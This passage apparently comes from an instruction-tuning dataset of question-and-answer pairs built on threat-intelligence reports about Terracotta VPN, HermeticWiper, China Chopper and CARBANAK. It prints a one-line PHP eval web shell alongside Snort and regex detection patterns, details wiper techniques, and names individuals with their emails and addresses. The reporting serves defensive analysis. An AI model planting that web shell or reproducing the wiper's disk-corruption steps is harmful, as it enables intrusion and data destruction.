    "output": "The internet era changes the traditional 'fog of war' by offering military and intelligence agencies new opportunities to expand and enhance Information Warfare (IW). This includes the ability to engage a worldwide audience that is both narrative-bearing and narrative-developing, making it more challenging for propagandists to predict how and where the narrative will evolve. However, it also provides defenders with more tools and tactics to counter hostile actions. The ubiquity and anonymity of internet communications offer nations like Russia new IW opportunities, while defenders can use accurate open source analysis to counter adversary operations, albeit with difficulty in a timely manner.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: WHO USES TERRACOTTA VPN?\nTo help characterize the Terracotta user base, RSA Research analyzed the Microsoft Remote Access Service (MSRAS) logs for a single Terracotta victim server for one month (Table 1).\nClearly, most users of Terracotta appear to originate within mainland PRC, as is consistent with where the service is marketed. In addition to the APT activity that has been observed, RSA Research believes that use cases include Great Firewall traversal, anonymity, peer to peer (P2P) file sharing and gaming acceleration; though this traffic analysis research is based on a limited number of network packet captures. Other (non-APT) criminal activity that may leverage Terracotta's anonymity is possible, but has not been observed to date. The clients of Terracotta may be entirely unaware of the organizations methods for obtaining servers and bandwidth.\nBig Headline: SUSPECTED NATION STATE SPONSORED CAMPAIGNS LEVERAGING TERRACOTTA VPN\nSince providing Terracotta VPN indicators to trusted partners, RSA Research has received several reports of suspected nation-state sponsored campaign activity originating from Terracotta VPN IP addresses. RSA Research can confirm that suspected nation-state actors have leveraged at least 52 Terracotta VPN nodes for exploitation of sensitive targets among Western government and commercial organizations. Perhaps one of the benefits of using Terracotta for Advanced Threat Actors is that their espionage-related network traffic can blend-in with 'otherwise-legitimate' VPN traffic.\nBig Headline: TERRACOTTA VPN LEVERAGED FOR PHISHING AND ATTEMPTED EXPLOITATION OF A DEFENSE CONTRACTOR\nRSA Research received a specific report from a large defense contractor concerning 27 different Terracotta VPN node IP addresses that were used to send phishing emails (Figure 6) targeting users in their organization. The phishing emails were simple HTML formatted emails with content pasted from legitimate online news articles.  The HTML formatted emails were loaded with an intelligence-gathering tool known as a \"web bug3\" that was specifically tailored to the recipient.\n3 https://en.wikipedia.org/wiki/Web_bug\nAn image reference in the email pointed to a website controlled by the actors that spoofed a popular Webmail provider. The image reference appeared to have been crafted so as to entice the target into logging into the phishing website with their legitimate credentials (Figure 7), thereby sending the targets' webmail credentials directly to the malicious actors. Typically APT actors use the information they gather from web bugs and phishing to later perform highly targeted exploitation or intelligence collection on specific users who have met their criteria.\nRSA Research investigated the domain infrastructure related to the phishing activity described above and enumerated related domains, as shown partially redacted in Table 2.\nThe partial- and un-redacted domains below are representative of brands that are commonly spoofed for phishing purposes. All of these domains have been reported and are obvious spoofs. The domains we have redacted involve specific government and defense sector targets. These have been reported and the targets have been notified. Further details can be made available to industry partners.\nDomains directly related to defense contractor phishing from Terracotta VPN nodes\nweblogin-yahoo.com\nweblogin-vxxxxxx.net\nlinkedinmember.com\nauth-vxxxxxx.com\nweblogin-live.com\n[10 related domains based on common hosting]\nTable 2. Terracotta-originating phishing campaign related domains\n\nHow does the Terracotta VPN facilitate various use cases, including potential criminal activities, and how does it blend in with legitimate VPN traffic?",
    "output": "The Terracotta VPN facilitates various use cases such as Great Firewall traversal, anonymity, peer-to-peer (P2P) file sharing, and gaming acceleration. This is evident from the analysis of Microsoft Remote Access Service (MSRAS) logs for a single Terracotta victim server over a month, which showed that most users originate from mainland PRC. Additionally, the VPN is leveraged by Advanced Threat Actors (ATAs) for espionage-related activities. The benefit for these actors is that their malicious traffic can blend in with otherwise legitimate VPN traffic, making it harder to detect and attribute.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Distribution of malicious Hangul documents disguised as press releases for the 20th presidential election onboard voting\nMarch 3, 2022\nAhead of the presidential election, the ASEC analysis team confirmed that malicious Korean documents disguised as \"press release on board the 20th presidential election\" were being distributed. The attacker distributed the malicious Korean document on February 28th, and the malicious document was not secured, but according to the company's AhnLab Smart Defense (ASD) infrastructure log, it is estimated that the batch file is driven through the internal OLE object to execute PowerShell. .\nDistribution file name: Press release\n(220228)_March_1st___March_4th_20th_Presidential Election_Shipboard\nVoting_Conducted (final).hwp\n[Figure 1] shows the batch file path and Korean file name confirmed in the infrastructure. While the same normal Korean document size is 2.06 MB, the malicious Korean document is 2.42 MB, and it seems that the document was created by inserting an additional BAT file inside.\n[Figure 1] ASD infrastructure collection\n%TEMP%\\mx6.bat (path of batch file creation)\nA similar type of attack was also confirmed on February 7th. According to the article, the attacker impersonated the National Election Commission (NEC) and distributed malicious documents disguised as a normal document titled \"Public Recruitment of Counting Observers for the 20th Presidential Election\".\n\"North Korean hackers distributing malicious press releases under the guise of the National Election Commission\" | DailyNK\nIt was found on the 8th that a North Korean hacking organization was distributing hacking emails impersonating the National Election Commission (NEC). Considering the fact that the press release distributed by the National Election Commission was used, it is highly likely that the attack is being carried out targeting journalists in the media, so caution is required. The common features of the malicious Hangul documents that were circulated at the time and the documents used in this attack are as follows.\nDissemination of malicious Korean documents disguised as the same institution (NEC)\nInducing Batch File Execution in OLE Object Way\nA PowerShell command containing a variable name ( $kkx9 ) similar to the one used in the NEC impersonation attack on 2/7 ( $kk y4 )\nPart of the PowerShell command: ( $kkx9 ='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);')\n[Figure 2] Some of the collected PowerShell commands\n[Figure 3] below is a normal Korean document presumed to have been used by the attacker for distribution.\n[Figure 3] Normal Korean document (press release (220228)_March_1st___March_4th_20th_Presidential Election_Shipboard Voting_Conduct (final).hwp)\nNormal official Korean documents can be found on the official website of the National Election Commission ( (<https://www.nec.go.kr/>)https://www.nec.go.kr/ ), and users should be skeptical when downloading similar documents from an unknown site.\nThe attackers seem to be carrying out various attacks impersonating the National Election Commission as the 20th presidential election approaches. AhnLab continues to monitor similar malicious behaviors and will share new information as soon as it becomes available.\nRead the text above and answer this question: What are the common characteristics between the malicious Hangul documents distributed in this attack and those from the previous attack on February 7th, and how do these characteristics help in identifying similar future attacks?",
    "output": "The common characteristics between the malicious Hangul documents from both attacks include: 1) Disguising the documents as originating from the same institution (National Election Commission), 2) Inducing batch file execution through an OLE object, and 3) Using a PowerShell command with a similar variable name ($kkx9 in the recent attack and $kk y4 in the previous attack). These characteristics suggest a pattern in the attackers' methods, which can help cybersecurity experts identify and mitigate similar future attacks by looking for these specific indicators.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical Analysis\nMultiple infection vectors for the HermeticWiper malware have been .\nThe delivery of the malware to a Ukrainian organization followed a Server Message Block (SMB)-based attack on a Microsoft Exchange server on December 23, 2021. The adversary initially stole credentials, and a web shell was installed on January 16, 2022. HermeticWiper was finally deployed on February 23, 2022.\nA Lithuanian organization that received HermeticWiper was initially compromised in November 2021. The delivery mechanism was suspected by Symantec as being an Apache Tomcat exploit that executed a malicious PowerShell command. This attack similarly included a credential harvesting component, followed quickly by the delivery and execution of the wiper malware as a scheduled task.\nIn several of the attacks, a ransomware executable was delivered alongside HermeticWiper. The victims received a ransomware notification providing 2 email addresses: vote2024forjb@protonmail[.]com and stephanie.jones2024@ protonmail[.]com. Symantec considers it likely that the ransomware component was the victims. WhisperGate attacks used a similar methodology, wherein the attack was disguised as ransomware. Both WhisperGate and HermeticWiper used separate components to prevent a victim's system from booting and file corruption; however, the component that played the role of ransomware changed between the 2 attacks. With WhisperGate, the wiper itself masqueraded as ransomware; however, with the HermeticWiper attacks, it was the file corrupter instead.\nESET reported that in one instance they observed, the malware was dropped via default Group Policy Objects (GPO), indicating that the adversaries almost certainly had control of an Active Directory server on the network.\nHermeticWiper's primary purpose is to corrupt the NTFS and/or FAT file systems of a victim's machine to prevent it from booting correctly. It was written in Visual Studio 2008 and 2015 in a combination of C and assembly and uses an included kernel driver to implement much of its disk access functionality. The use of a kernel driver instead of conventional Windows API calls is to evade detections that may catch the higher-level API calls being made. The compiler timestamps for 2 samples show that they were compiled on December 28, 2021, and 1 other sample shows February 23, 2022. Although timestamps can be forged, the timestamp from December 28, 2021, could be used to determine how far in advance this operation was planned. Each sample is signed using what was, at the time, a valid certificate issued to Hermetica Digital Ltd. Since the malware's discovery, the certificate has since been revoked by the Certificate Authority, as shown in Figure 1 above.\nUpon execution, the wiper adjusts its process token privileges to acquire SeBackupPrivilege and SeShutdownPrivilege in order to obtain read privileges to any files and eventually shut down the system before terminating. Next, it determines the Windows version and bitness (x86 or x86_64) of the victim's machine in order to determine which kernel driver, located in the PE's resource section, to later load. The kernel drivers are legitimate, benign software used by EaseUS's Partition Master and are signed with a certificate issued to EaseUS's parent company, CHENGDU YIWO Tech Development Co., Ltd., shown in Figure 2 below. Although the certificate has expired, newer versions of Windows 10 allow for kernel drivers with certificates issued before July 29, 2015, to be loaded.\nTo create the service, the process's token privileges are adjusted again to add SeLoadDriverPrivilege. A service is then created, configured, and started. Once the driver is successfully loaded, the created service's registry entry is removed from HKLM\\SYSTEM\\CurrentControlSet\\services\\. Next, the Volume Shadow Service (VSS) is stopped and disabled, as shown in Figure 4, to make recovery more difficult.\nThe wiper then begins to iterate through all physical drives on the system one at a time by attempting to access \\\\.\\PhysicalDrive<1-100>. For each drive, junk data is written to seemingly random locations of the disk in order to corrupt it. Additionally, the partitions on each physical disk are enumerated and any identified as FAT or NTFS file systems are corrupted by writing random data to the file system header. Although public reporting has stated that the MBR is \"wiped\", which typically means the MBR is overwritten, in our analysis we have concluded that only the file system is corrupted along with random locations on the disk. The end result similarly results in a loss of the stored data and inability of the victim machine to boot. Appendix A provides the output from a tool, , that captured the SetFilePointerEX and WriteFile API calls used to corrupt the hard drives on the victim's machine. There were no writes to the \"0\" index, where the MBR would reside, however there are writes to the index, 1048576, which is the location of the NTFS file system header. The additional writes are to seemingly random locations on disk.\nThe corruption of the file systems goes beyond a simple MBR overwrite and is more effective because it impacts a (i.e., MBR, GPT). This technique is more robust than the MBR overwrite used in the WhisperGate attacks, where (<https://www.recordedfuture.com/whispergate-malware-corrupts-computers-ukraine/>)we showed that GPT-style disks could recover from the MBR overwrite.\nThe kernel drivers are stored as RCDATA in the PE file's victim's ability to boot regardless of the disk partitioning scheme resource section, as shown in Figure 3 below. Each driver is compressed using Microsoft's , based on the Lempel\u2013Ziv\u2013Storer\u2013Szymanski (LZSS) .\nAfter corrupting the file system the wiper disables the ShowCompColor and ShowInfoTip values in the Software\\ Microsoft\\CurrentVersion\\Explorer\\Advanced registry key in order to prevent encrypted NTFS files from showing in color and showing pop-up descriptions for folders, respectively. Then\nAfter locating the correct driver, the wiper then proceeds to disable if the victim is running a 64-bit OS. This prevents 64-bit systems from loading 32-bit kernel drivers from the %windir%\\SysWOW64\\drivers directory and instead forces them to use %windir%\\system32\\drivers, where the malware will eventually place the kernel driver. it proceeds to corrupt logs and data on NTFS file systems.\nNext, Crash Dumps are disabled by modifying the registry Finally, the wiper attempts to shut the system down with a value \"CrashDumpEnabled\" to 0 for the key HKLM\\SYSTEM\\ call to InitiateSystemShutdownExW. Once the victim machine is CurrentControlSet\\Control\\CrashControl. This is likely done to rebooted, the user is presented with an error message indicating avoid writing a crash dump to disk when the program terminates. that their system cannot boot. In the case of MBR-style disks,\nThe compressed driver resource is then written to the the victim is presented with a message similar to the one shown %windir%\\system32\\drivers directory with a name consisting of in Figure 5; or in the case of GPT-style disks, the one shown 2 pseudorandom lowercase characters followed by \"dr\". Then in Figure 6. In both cases, although the MBR is still intact, the driver is decompressed, and a service with the same name the system is unable to boot due to the corrupted file system is temporarily created to load the driver. partition containing the Operating System.\nMedium Headline: PartyTicket\nInsikt Group analyzed the ransomware associated with the HermeticWiper malware, dubbed PartyTicket. The ransomware contained several path strings and function names that allude to the White House, Joe Biden, and elections, among other topics, seen below in Figures 7 and 8.\nFigure 8: Ransomware function names (Source: Recorded Future)\nSimilarly, the ransom note dropped by the malware contained email addresses on similar topics, and the encrypted files were renamed with the suffix \"[vote2024forjb@protonmail[.]com]. encryptedJB\", as shown in Figure 10.\nFigure 10 below shows the ransomware note dropped by PartyTicket. While Insikt Group cannot currently attribute the ransomware to any specific group, the note differs substantially from that of other ransomware groups we have seen.\nThere is no \"branding\" identifying a particular ransomware group responsible for the attack, and there are several misspellings and grammatical errors throughout the note. As a result, the ransomware component of the HermeticWiper malware is unlikely to have been developed and distributed by a criminal ransomware group. Further, the malware contains a list of files, shown in Figure 12 below, that it seeks to encrypt. Unlike all other recent, criminal-operated ransomware variants, this list includes files that are key to the ability of the victim system to operate, including .dll and .exe files. This further suggests that this is not legitimate ransomware but rather a destructive piece of malware.\n-inf .acl, .avi .bat .bmp .cab .cfg .chm .cmd .com .crt .css .dat .dip .dll .doc .dot .exe .gif .htm .ico .iso .jpg .mp3 .msi .odt .one .ova .pdf .png .ppt .pub .rar .rtf .sfx .sql .txt .url .vdi .vsd .wma .wmv .wtv .xls .xml .xps .zip\nFigure 11: File extensions the \"ransomware\" seeks to encrypt (Source: Recorded Future)\n\nAnswer this question based on the above context: What is the significance of the compiler timestamps found in the HermeticWiper samples, and how can they provide insights into the planning of the operation?",
    "output": "The compiler timestamps found in the HermeticWiper samples indicate when the malware was compiled. Two samples were compiled on December 28, 2021, and another on February 23, 2022. Although timestamps can be forged, the December 28, 2021, timestamp suggests that the operation was planned well in advance. This information can provide insights into the adversaries' preparation and coordination efforts, indicating a potentially sophisticated and well-resourced threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Network\nWith a standard Snort9 IDS in place, this traffic can be caught with relative ease. Keith Tyler provides the following basic IDS signature in his previously cited China Chopper blog post:10\nTo reduce false positives, tighten the Snort IDS signature to focus on China Chopper by looking for contents of \"FromBase64String\" and \"z1\" as follows:\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg: \"China Chopper with first Command Detected\"; flow:to_server,established; content: \"FromBase64String\"; content: \"z1\"; content:\"POST\"; nocase;http_method; reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/ breaking-down-the-china-chopper-web-shell-part-i.html; classtype:web-application-attack; sid: 900000101;)\nThe following IDS signature looks for content of \"FromBase64String\" and any combination of \"z\" followed by one to three digits\u2014it would find \"z1\", \"z10\", or \"z100\" for example. The idea: if the first command (z1) is missed, the signature still catches subsequent commands.\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n(msg: \"China Chopper with all Commands Detected\"; flow:to_ server,established; content: \"FromBase64String\"; content: \"z\"; pcre: \"/Z\\d{1,3}/i\"; content:\"POST\"; nocase;http_method; reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/ breaking-down-the-china-chopper-web-shell-part-i.html; classtype:web-application-attack; sid: 900000102;)\nBoth of these IDS signatures can be optimized further to factor depth and offset. Be sure to put a valid SID in before implementing and test the signature for performance.\n9 Snort is available at http://www.snort.org/.\n10 Keith Tyler. \"China Chopper Webshell - the 4KB that Owns your Web Server\". November 2012.\nMedium Headline: Host\nBecause the shells must contain a predictable syntax, researchers can quickly attempt to find files that have that code in play.\nMany methods can be used to find files that contain China Chopper. The quickest and easiest method, especially on a Linux machine, is probably using regular expressions. As shown in Figure 26, a quick egrep across the Web directory can help identify infected files.\nAs shown in Figure 26, the egrep and regex commands are a powerful combination. While the regex syntax may seem like gibberish, mastering it is not as difficult as it seems at first glance. Ian Ahl has created a few tutorials that can help improve researchers' regex skills. Here are two to get started:\n\u2022 Regex basics (http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html)\n\u2022 Using regex with Notepad (http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regex-with-notepad.html)\nWindows also provides a way to search files using regular expressions with its native findstr command.\nc:\\Tools>findstr /R \"[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]\" *.php test.php:<?php @eval($_POST['password']);?> c:\\Tools>\u2013\nFigure 27: Using findstr to locate\nChina Chopper\nThe command string differs from the regex equivalent. This was necessary to get around some of the ways that findstr interprets regex.\nThe findstr command runs as follows:\nThese examples show detection in the PHP shell. To find the ASPX shell, modify the regex to fit the syntax of the ASPX shell as shown:\negrep -re '[<]\\%\\@\\sPage\\sLanguage=.Jscript.\\%[>][<]\\%eval.Request\\. Item.+unsafe' *.aspx\nfindstr /R \"[<]\\%\\@.Page.Language=.Jscript.\\%[>][<]\\%eval.Request\\. Item.*unsafe\" *.aspx\nResearchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command with some extended options to help identify Web files to run the regex command against (see Figure 28).\nFindstr also has an option to search all subdirectories (see Figure 29), as follows:\nfindstr /R /S \"[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]\" *.php\nMedium Headline: About FireEye\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye Threat Prevention Platform\u2122 provides real-time, dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors, including Web, email, and files and across the different stages of an attack life cycle. The core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,100 customers across more than 40 countries, including over 100 of the Fortune 500.\n\u00a9 2013  FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners. \u2013 RPT.CCWS.EN-US.112013\nRead the text above and answer this question: How can an intrusion detection system (IDS) like Snort be configured to detect the presence of China Chopper Web shell traffic, and what specific content patterns should be monitored to minimize false positives?",
    "output": "An IDS like Snort can be configured to detect China Chopper Web shell traffic by using specific signatures. To minimize false positives, the Snort IDS signature should be tightened to look for the contents of 'FromBase64String' and 'z1'. For example, the following signature can be used: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg: 'China Chopper with first Command Detected'; flow:to_server,established; content: 'FromBase64String'; content: 'z1'; content:'POST'; nocase;http_method; reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/ breaking-down-the-china-chopper-web-shell-part-i.html; classtype:web-application-attack; sid: 900000101;)`. Additionally, another signature can be used to catch subsequent commands by looking for 'FromBase64String' and any combination of 'z' followed by one to three digits, such as 'z1', 'z10', or 'z100': `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg: 'China Chopper with all Commands Detected'; flow:to_server,established; content: 'FromBase64String'; content: 'z'; pcre: '/Z\\\\d{1,3}/i'; content:'POST'; nocase;http_method; reference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/ breaking-down-the-china-chopper-web-shell-part-i.html; classtype:web-application-attack; sid: 900000102;)`.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: VPSNOC/Digital Linx/Tranchulas\nDuring our research into VPSNOC, we identified that it is actually based in, or conducts partial operations from within, Pakistan. The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space (Figure 4). The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting. Digital Linx is also a Pakistan-based hosting company (Figure 5).\n12 Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up - (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml\nFigure 5: Digital Linx (digitallinx.com)                                                               Website  indicating its location\nAs seen in Figure 6, the administrative email address is admin@digitallinx.org. 13 This is the same registrant record for the digitallinx.net domain.14 The domains digitillinx.org, digitallinx.net, and digitallinx.com share current and historical similarities in their WHOIS records and sitemap.xml files 15 16 that imply they are all controlled by the same individual or entity. The domain digitallinx.com is registered to Muhammad Naseer Bhatti (Digital Linx Founder)17 18 19 who uses email addresses naseer@digitallinx.com and nbhatti@gmail.com. The domain is also registered to the address 638-F Johar Town, Lahore Pakistan.20\nThe contact telephone number listed on Digital Linx' web site is 925-665-1427 (Figure 6), and is also used in the WHOIS record for defiantmarketing.com21.\nThe domain defiantmarketing.com is registered to Abunasar Khan. The registration lists VPSNOC as the registrant organization, abunasar@yahoo.com as the registration email address, and House 12, Street 21, F-8/1 Islamabad Federal 44000 as the registration address. Abunasar Khan has been observed using the aliases \"agnosticon\" 22 and \"agnostic\". From this we were able to locate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as a subdivision of Digital Linx Hosting (Figure 7).23 Though none of this information is surprising, it further suggests that both Bhatti and Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan.24\n13 https://whois.domaintools.com/vpsnoc.com\n14 https://whois.domaintools.com/digitallinx.net\n15 http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us\n16 http://digitallinx.net/Contact.html\n17 https://whois.domaintools.com/digitallinx.com\n18 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n19 https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ\n20 https://github.com/digitallinx/vBilling/blob/master/CHANGELOG\n21 https://whois.domaintools.com/defiantmarketing.com\n22 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n23 http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html\n24 https://dazzlepod.com/rootkit/?page=284\nAdditional research into Abunasar Khan identified several registered domains and fragments of his online presence. Based on his websites and account information, he appears to have an interest or participated in the Antisec26 and Anonymous27 movements (Figure 8). He also used \"anony mo us\" in the registration name field of a personal account 28 .\nIn addition, Abunasar Khan's Google+ profile revealed connections to at least one Tranchulas employee, Hamza Qamar29 and a Digital Linx employee, Shoaib Riaz.30 31Hamza Qamar, the Team Lead for Penetration Testing at Tranchulas, with whom TCIRT last spoke.32 Visiting Hamza Qamar's Google+ page (Figure 9), the only directly connected person was Abunasar Khan. At this point, it shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with Hamza Qamar, the Penetration Testing employee from Tranchulas.\n25 http://vpsnoc.com/order.png\n26 http://abunasar.net\n27 http://pastebin.com/rqVGqh1q\n28 https://dazzlepod.com/rootkit/?page=284\n29 https://plus.google.com/105774284158907153401/about\n30 https://plus.google.com/105059395104464629441/about\n31 http://lists.horde.org/archives/horde/Week-of-Mon-20061225/032545.html\n32 https://plus.google.com/103436628630566104748/posts\nQamar indicated on his public LinkedIn profile that he \"engaged in system and enterprise level network and Web application security testing for clients ranging from large federal agencies, DoD, and commercial clients\", though it is unclear which \"DoD\" is referenced (e.g., whether the Pakistani Ministry of Defense or some other nation's defense department). Tranchulas identifies government (presumably Pakistan's government) as an operational sector for its work. Tranchulas' offensive cyber initiative services are offered to \"national-level cyber security programs\" 33 34 indicating commercial demand from \"national-level\" customers. Though Tranchulas35 brands itself as a multi-national company, with respective addresses within the United Kingdom36, the United States37, and New Zealand38. We found evidence that these addresses are all associated with either virtual office spaces or address forwarding services.\nFor further background information on these personas, please see Appendix F: Personas.\nThe following is a summary of the relationships between the hosting organizations and Tranchulas:\n\u2022 VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that contained build strings that referenced \"Tranchulas\" and a Tranchulas employee.\n\u2022 Tranchulas and VPNSOC were in direct communication at some point in July-August 2013.\n\u2022 VPNSOC is a subsidiary of Digital Linx.\n\u2022 Tranchulas, VPNSOC, Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S.\n\u2022 Hamza Qamar was an employee of Tranchulas.\n\u2022 Muhammad Naseer Bhatti was the self-proclaimed founder of Digital Linx.\n\u2022 Abunasar Khan was affiliated with AntiSec and VPNSOC.\n\u2022 Digital Linx founder Muhammad Naseer Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan39 \u2013 connected through domain registrations and a common Google+ profile for Shoaib Riaz (another Digital Linx employee).\n\u2022 VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+.\n33 http://www.prnewswire.co.uk/news-releases/tranchulas-steps-into-the-global-cyber-strategy-market-with-launch-of-the-offensive-cyber-initiative-oci-230411011.html\n34 Digital Appendix 3: Screenshot Archives (tranchulas.com/offensive-cyber-initiative-oci.png)\n35 Digital Appendix 3: Screenshot Archives (tranchulas.com/contact-us)\n36 http://www.londonpresence.com/contact-us/\n37 http://nextspace.us/nextspace-union-square-san-francisco/\n38 http://www.privatebox.co.nz/virtual-office/virtual-office-address.php\nNote: A walkthrough of our research is available in Appendices C, D and E.\nMedium Headline: Metadata Analysis:\nAs mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx). In reviewing the document metadata for \"Response_ThreatConnect.docx \", TCIRT identified that it contained the creator properties of \"hp.\" TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and found that both also had the author of \"hp\" (Figure 10).\n39 http://www.know-hosting.com/view/27108-digitallinx.html\nWhile the author field of \"hp\" doesn't conclusively prove a relationship, it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns.\n\nQuestion: How did the researchers determine that VPSNOC and Digital Linx were linked to each other and operated from Pakistan despite giving the impression of being based in Kansas City?\n\nAnswer:",
    "output": "The researchers determined the link between VPSNOC and Digital Linx through several pieces of evidence. Firstly, the Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting, which is a Pakistan-based hosting company. Additionally, the administrative email address for Digital Linx, admin@digitallinx.org, matched the registrant record for the digitallinx.net domain. The domains digitallinx.org, digitallinx.net, and digitallinx.com shared similarities in their WHOIS records and sitemap.xml files, suggesting they were controlled by the same entity. Furthermore, the domain digitallinx.com was registered to Muhammad Naseer Bhatti, the founder of Digital Linx, with an address in Lahore, Pakistan. The contact telephone number listed on Digital Linx's website was also used in the WHOIS record for defiantmarketing.com, further solidifying the connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. GLOSSARY OF TERMS\n\u2022 Actions-on-objective: Command execution, file interaction and other actions an attacker may take when interacting with compromised systems.\n\u2022 Lateral movement: The movement of a user session to a system within the network boundaries of an organization from a system also present within the same network boundary.\n\u2022 Internal reconnaissance: Obtaining initial or additional information about systems, users, login methods and network paths of systems internal to an organization's network.\n\u2022 Credential Harvesting: The acquisition and collection of initial or additional user account credentials for use in lateral movement.\n\u2022 Security event: An asset or system action, or communication, that diverges from regular operational activity in a way that the security posture of that asset becomes suspect.\n\u2022 Security incident: A security event or group of security events that have been confirmed, either singularly or in aggregate, as being malicious in intent.\n\u2022 Compromise: Unauthorized, unforeseen or unknown actions conducted on an informational asset that allows for direct and unauthorized access and interaction.\n\u2022 Intrusion: The direct and unauthorized access and interaction of a malicious actor with systems or assets internal to an organization's network.\n\u2022 Staging: The actions involved in occupying and preparing an internal system or asset to secure additional resources and ensure persistence of attacker ingress access.\n\u2022 Declaration: The point in time in which an organization confirms the presence of an attacker in an environment and initiates incident response procedures.\n\u2022 Indicator of Compromise (IOC): A behavior, pattern, network address, computed file hash or other system or network attribute that can be correlated to malicious activity.\nMedium Headline: 3.1 ANATOMY OF ATTACK\nIn researching this white paper, the majority of intelligence and incident reports reviewed described phishing and malicious document-related tactics being utilized by CARBANAK actors as a method of initial compromise. However, the initial method of compromise observed during this engagement utilized the Apache Struts Content-Type arbitrary command execution vulnerability, CVE-2017-5638. 10 This vulnerability has since been patched by the Apache Software Foundation, and the recommended remediation process is available on their website.11 While the time-tested method of compromising the user base as the initial ingress method is still very effective, server-level compromises commonly give attackers a significant escalation in initial privilege, as well as a shorter path between initial compromise and end-target data. This allows them greater rights and versatility upon initial compromise while making it harder for defenders to stop them on the initially compromised system. An anatomy of the engagement, broken into the primary stages, is illustrated in Figure 2.\nUpon determining that the initially compromised web server, designated as system ALPHA, was vulnerable to CVE-2017-5638, the rest of the attacker actions could be grouped into the eight stages illustrated in Figure 2. These phases are described further in the remainder of Section 3. All binaries, with the exception of the 'b' Perl script, are described in detail in Section 4.\n10 \"Common Vulnerabilities and Exposures\";\n11 \"Apache Struts Documentation: S2-046\";\nSmall Headline: 3.1.1 Phase 1: D+0\nInitial Compromise, Initial Code Execution\nAttackers from IP 185.117.88.97 utilize CVE-2017-5638 to download and execute a Perl script on ALPHA. The Perl script was downloaded via WGET from IP 95.215.45.116. This action constitutes the moment of initial compromise and is referenced in this document as \"D.\"  All other times\ndiscussed in this report will use this moment as a reference in their notation, such that \"D+2\" refers to two days after initial compromise. The metadata created by RSA NetWitness Suite describing this action is shown in Figure 3.\nSmall Headline: 3.1.2 Phase 2: D+0\nInternal Reconnaissance, Privilege Escalation, Persistence\nSix minutes after the download and execution of the Perl script, system ALPHA began communicating with IP address 95.215.46.116 via IRC. While the available full packet capture retention did not extend to this date at the time of analysis, the metadata created was still available. While RSA was unable to review the raw data to determine actions taken, RSA IR was able to determine traffic type, as well as infer the intention of the nature of actions taken via this channel. It appeared that this IRC communication was a method of remote command execution conducted by the attackers, evidenced by the presence of an output from the \"w\" User Activity Linux binary. This is illustrated in Figure 4.\nWhile the attackers attempted to use the 'sudo' administrative privilege binary to gain root access, the privilege-separation user the web server was running as did not have the necessary permission. In response to this, the attackers downloaded a copy of C source Proof of Concept (PoC) code written by \"KrE80r\" to exploit the Linux Kernel Copy-on-Write \"Dirty COW\" vulnerability, CVE-2016-5195. 12 This vulnerability has since been resolved by the major Linux distributions, with the list of patched kernels found on GitHub.13  At the same time, the attackers downloaded a Bash shell script as a driver for the exploit code, named '1.sh'. This allowed the attackers to gain root privileges on the system at the 27-minute mark. The observed download is shown in Figure 5.\n12 \"Common Vulnerabilities and Exposures\";\nWhile the 